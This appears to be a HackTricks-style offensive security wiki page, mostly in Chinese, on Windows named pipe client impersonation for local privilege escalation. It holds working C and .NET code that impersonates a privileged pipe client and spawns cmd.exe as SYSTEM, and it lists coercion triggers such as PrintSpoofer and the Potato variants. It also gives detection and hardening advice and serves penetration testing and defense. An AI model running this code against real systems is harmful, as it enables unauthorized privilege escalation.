# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation 是一个本地权限提升原语，允许命名管道服务器线程采用连接到它的客户端的安全上下文。实际上，能够以 SeImpersonatePrivilege 运行代码的攻击者可以强迫一个特权客户端（例如，SYSTEM 服务）连接到攻击者控制的管道，调用 ImpersonateNamedPipeClient，将得到的令牌复制为主令牌，然后以该客户端的身份创建进程（通常是 NT AUTHORITY\SYSTEM）。

本页侧重于核心技术。关于将 SYSTEM 强制连接到你管道的端到端利用链，请参见下文提到的 Potato 家族页面。

## TL;DR
- 创建命名管道：\\.\pipe\<random> 并等待连接。
- 让一个特权组件连接到它（spooler/DCOM/EFSRPC/etc.）。
- 从管道至少读取一条消息，然后调用 ImpersonateNamedPipeClient。
- 从当前线程打开模拟令牌，DuplicateTokenEx(TokenPrimary)，并使用 CreateProcessWithTokenW/CreateProcessAsUser 获取一个 SYSTEM 进程。

## Requirements and key APIs
- 调用进程/线程通常需要的权限：
- SeImpersonatePrivilege 用于成功模拟连接的客户端并使用 CreateProcessWithTokenW。
- 或者，在模拟到 SYSTEM 之后，可以使用 CreateProcessAsUser，这可能需要 SeAssignPrimaryTokenPrivilege 和 SeIncreaseQuotaPrivilege（当你模拟为 SYSTEM 时，这些权限已满足）。
- 使用的核心 API：
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（在模拟之前必须至少读取一条消息）
- ImpersonateNamedPipeClient 和 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 或 CreateProcessAsUser
- Impersonation level：要在本地执行有用操作，客户端必须允许 SecurityImpersonation（这是许多本地 RPC/命名管道客户端的默认设置）。客户端可以在打开管道时通过 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 降低此级别。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
注意：
- 如果 ImpersonateNamedPipeClient 返回 ERROR_CANNOT_IMPERSONATE (1368)，请确保先从管道读取，并确认客户端没有将 impersonation 限制为 Identification level。
- 优先使用 DuplicateTokenEx，配合 SecurityImpersonation 和 TokenPrimary，以创建适合用于进程创建的主令牌。

## .NET 快速示例
在 .NET 中，NamedPipeServerStream 可以通过 RunAsClient 进行 impersonation。一旦进行 impersonation，复制线程令牌并创建进程。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## 常见触发/强制手段，让 SYSTEM 连接到你的管道
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## 故障排查与注意事项
- 在调用 ImpersonateNamedPipeClient 之前，必须至少从管道读取一条消息；否则会收到 ERROR_CANNOT_IMPERSONATE (1368)。
- 如果客户端以 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 连接，服务器不能完全 impersonate；通过 GetTokenInformation(TokenImpersonationLevel) 检查 token 的 impersonation level。
- CreateProcessWithTokenW 要求调用者具有 SeImpersonatePrivilege。如果失败并报 ERROR_PRIVILEGE_NOT_HELD (1314)，在你已经 impersonated SYSTEM 之后使用 CreateProcessAsUser。
- 如果你对管道进行了加固，请确保管道的安全描述符允许目标服务连接；默认情况下，位于 \\.\pipe 下的管道可根据服务器的 DACL 访问。

## 检测与加固
- 监控命名管道的创建和连接。Sysmon Event IDs 17 (Pipe Created) 和 18 (Pipe Connected) 对基线合法管道名称以及捕获在 token-manipulation 事件之前出现的异常、看起来随机的管道很有用。
- 查找如下序列：进程创建管道，SYSTEM 服务连接，然后创建进程以 SYSTEM 身份生成子进程。
- 通过从非必要的服务账户移除 SeImpersonatePrivilege，并避免不必要的高权限服务登录来减少暴露。
- 防御性开发：连接不受信任的命名管道时，指定 SECURITY_SQOS_PRESENT 与 SECURITY_IDENTIFICATION，以防止服务器在非必要情况下完全 impersonate 客户端。

## 参考
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
